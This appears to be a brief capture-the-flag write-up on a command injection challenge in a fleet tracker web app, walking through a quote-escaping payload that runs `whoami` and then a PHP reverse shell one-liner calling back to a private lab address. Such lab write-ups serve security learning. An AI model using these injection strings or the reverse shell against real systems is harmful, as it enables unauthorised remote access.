## Command Injection Challenge
- Objective: Prove code execution
- Extra credit: Pop a shell
### Normal App Functionality
- A fleet tracker app
- List current fleet; registration plate, position, destination, and status
- Can change the status of the vehicle by entering the registration plate and position
- It shows the command executed after submitting a vehicle position
- Entering `ASH`, `50`, and `100` returns:

### Try Payloads for Different Behavior
- Since the positions are included in the output, I'll try putting the payload in those fields
- Noticing that the executed command includes a quote, I'll try starting the paload with a quote
- Enter `'; whoami #` results in `www-data` being returned as the result

- Objective complete!

### Reverse Shell
- A bash reverse shell did not work
- Executing `ls` showed many PHP files, so I'll try a PHP reverse shell
- Enter `'; /usr/local/bin/php -r '$sock=fsockopen("10.0.2.15",8080);exec("/bin/sh -i <&3 >&3 2>&3");' #`:
